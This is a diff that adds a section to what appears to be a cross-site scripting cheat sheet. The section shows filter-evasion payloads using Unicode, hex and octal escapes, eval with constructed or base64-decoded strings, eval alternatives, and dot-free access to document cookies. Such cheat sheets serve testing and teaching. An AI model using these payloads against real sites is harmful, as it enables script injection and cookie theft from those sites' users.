@@ -220,6 +220,55 @@ FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
 2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>. 
 ``` 
  
-
+**Using JavaScript Escaping**
  
+JavaScript allows various kinds of character escaping, which you can use to avoid including required expressions in their literal form. Unicode escapes can be used to represent characters within JavaScript keywords, allowing you to bypass many kinds of filters:
+ 
+```
+<script>a\u006cert(1);</script>
+```
+
+If you can make use of the ```eval``` command, possibly by using the preceding technique to escape some of its characters, you can execute other commands by passing them to the ```eval``` command in string form. This allows you to use various string manipulation techniques to hide the command you are executing. Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes:
+
+```
+<script>eval(‘a\u006cert(1)’);</script>
+<script>eval(‘a\x6cert(1)’);</script>
+<script>eval(‘a\154ert(1)’);</script>
+```
+
+Furthermore, superfluous escape characters within strings are ignored:
+
+```
+<script>eval(‘a\l\ert\(1\)’);</script>
+```
+
+**Dynamically Constructing Strings**
+
+You can use other techniques to dynamically construct strings to use in your attacks:
+
+```
+<script>eval(‘al’+’ert(1)’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+```
+
+The final example, which works on Firefox, allows you to decode a Base64-encoded command before passing it to ```eval```
+ 
+**Alternatives to eval**
+
+If direct calls to the eval command are not possible, you have other ways to execute commands in string form:
+ 
+```
+<script>’alert(1)’.replace(/.+/,eval)</script>
+<script>function::[‘alert’](1)</script>
+```
+
+**Alternatives to Dots**
+
+If the dot character is being blocked, you can use other methods to perform dereferences:
+
+```
+<script>alert(document[‘cookie’])</script>
+<script>with(document)alert(cookie)</script>
+```
 References: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwim7cD06oL5AhWZk4kEHcDGAzMQFnoECAYQAQ&url=http%3A%2F%2Fwww.xss-payloads.com%2F&usg=AOvVaw1-hKbfrHEIcldlShn1bjoC
